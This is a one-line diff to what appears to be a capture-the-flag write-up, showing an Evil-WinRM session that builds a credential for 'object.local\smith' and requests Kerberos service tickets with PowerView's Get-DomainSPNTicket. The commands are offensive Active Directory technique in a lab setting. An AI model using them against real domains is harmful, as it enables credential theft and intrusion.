@@ -488,7 +488,7 @@ Warning: [Get-DomainSPNTicket] Error requesting ticket for SPN 'nonexistent/BLAH
 - Let's generate one and run it again
 ```
 *Evil-WinRM* PS C:\programdata> $password = ConvertTo-SecureString 'P@ssw0rd!@#' -AsPlainText -Force
-*Evil-WinRM* PS C:\programdata> $creds = $cred = New-Object System.Management.Automation.PSCredential('object.local\smith', $password)
+*Evil-WinRM* PS C:\programdata> $creds = New-Object System.Management.Automation.PSCredential('object.local\smith', $password)
 *Evil-WinRM* PS C:\programdata> Get-DomainSPNTicket -SPN "nonexistent/BLAHBLAH" -Credential $creds
 Warning: [Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.
 Warning: [Invoke-UserImpersonation] Executing LogonUser() with user: object.local\smith
